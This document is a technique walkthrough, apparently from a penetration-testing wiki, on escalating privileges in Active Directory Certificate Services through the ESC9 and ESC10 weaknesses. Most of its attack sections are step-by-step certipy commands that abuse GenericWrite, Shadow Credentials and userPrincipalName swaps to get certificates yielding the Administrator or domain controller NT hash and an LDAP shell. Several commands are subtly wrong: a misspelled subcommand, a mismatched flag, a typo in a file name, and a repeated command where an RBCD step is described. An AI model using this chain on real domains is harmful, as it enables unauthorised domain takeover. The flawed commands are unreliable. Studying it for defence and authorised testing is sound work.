# AD CS Domain Escalation - ESC9 to ESC10

## Weak Certificate Mappings - ESC10



### Explanation

Two registry key values on the domain controller are referred to by ESC10:

- The default value for `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), previously set to `0x1F`.
- The default setting for `StrongCertificateBindingEnforcement` under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, previously `0`.

**Case 1**

When `StrongCertificateBindingEnforcement` is configured as `0`.

**Case 2**

If `CertificateMappingMethods` includes the `UPN` bit (`0x4`).

### Abuse Case 1

With `StrongCertificateBindingEnforcement` configured as `0`, an account A with `GenericWrite` permissions can be exploited to compromise any account B.

For instance, having `GenericWrite` permissions over `Jane@corp.local`, an attacker aims to compromise `Administrator@corp.local`. The procedure mirrors ESC9, allowing any certificate template to be utilized.

Initially, `Jane`'s hash is retrieved using Shadow Credentials, exploiting the `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Subsequently, `Jane`'s `userPrincipalName` is altered to `Administrator`, deliberately omitting the `@corp.local` portion to avoid a constraint violation.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Following this, a certificate enabling client authentication is requested as `Jane`, using the default `User` template.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane`'s `userPrincipalName` is then reverted to its original, `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Authenticating with the obtained certificate will yield the NT hash of `Administrator@corp.local`, necessitating the specification of the domain in the command due to the absence of domain details in the certificate.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Abuse Case 2

With the `CertificateMappingMethods` containing the `UPN` bit flag (`0x4`), an account A with `GenericWrite` permissions can compromise any account B lacking a `userPrincipalName` property, including machine accounts and the built-in domain administrator `Administrator`.

Here, the goal is to compromise `DC$@corp.local`, starting with obtaining `Jane`'s hash through Shadow Credentials, leveraging the `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

`Jane`'s `userPrincipalName` is then set to `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

A certificate for client authentication is requested as `Jane` using the default `User` template.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane`'s `userPrincipalName` is reverted to its original after this process.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

To authenticate via Schannel, Certipy’s `-ldap-shell` option is utilized, indicating authentication success as `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Through the LDAP shell, commands such as `set_rbcd` enable Resource-Based Constrained Delegation (RBCD) attacks, potentially compromising the domain controller.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

This vulnerability also extends to any user account lacking a `userPrincipalName` or where it does not match the `sAMAccountName`, with the default `Administrator@corp.local` being a prime target due to its elevated LDAP privileges and the absence of a `userPrincipalName` by default.



## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>



### Explanation

The new value **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) for **`msPKI-Enrollment-Flag`**, referred to as ESC9, prevents the embedding of the **new `szOID_NTDS_CA_SECURITY_EXT` security extension** in a certificate. This flag becomes relevant when `StrongCertificateBindingEnforcement` is set to `1` (the default setting), which contrasts with a setting of `2`. Its relevance is heightened in scenarios where a weaker certificate mapping for Kerberos or Schannel might be exploited (as in ESC10), given that the absence of ESC9 would not alter the requirements.

The conditions under which this flag's setting becomes significant include:

- `StrongCertificateBindingEnforcement` is not adjusted to `2` (with the default being `1`), or `CertificateMappingMethods` includes the `UPN` flag.
- The certificate is marked with the `CT_FLAG_NO_SECURITY_EXTENSION` flag within the `msPKI-Enrollment-Flag` setting.
- Any client authentication EKU is specified by the certificate.
- `GenericWrite` permissions are available over any account to compromise another.

### Abuse Scenario

Suppose `John@corp.local` holds `GenericWrite` permissions over `Jane@corp.local`, with the goal to compromise `Administrator@corp.local`. The `ESC9` certificate template, which `Jane@corp.local` is permitted to enroll in, is configured with the `CT_FLAG_NO_SECURITY_EXTENSION` flag in its `msPKI-Enrollment-Flag` setting.

Initially, `Jane`'s hash is acquired using Shadow Credentials, thanks to `John`'s `GenericWrite`:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Subsequently, `Jane`'s `userPrincipalName` is modified to `Administrator`, purposely omitting the `@corp.local` domain part:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

This modification does not violate constraints, given that `Administrator@corp.local` remains distinct as `Administrator`'s `userPrincipalName`.

Following this, the `ESC9` certificate template, marked vulnerable, is requested as `Jane`:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

It's noted that the certificate's `userPrincipalName` reflects `Administrator`, devoid of any “object SID”.

`Jane`'s `userPrincipalName` is then reverted to her original, `Jane@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Attempting authentication with the issued certificate now yields the NT hash of `Administrator@corp.local`. The command must include `-domain <domain>` due to the certificate's lack of domain specification:

```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
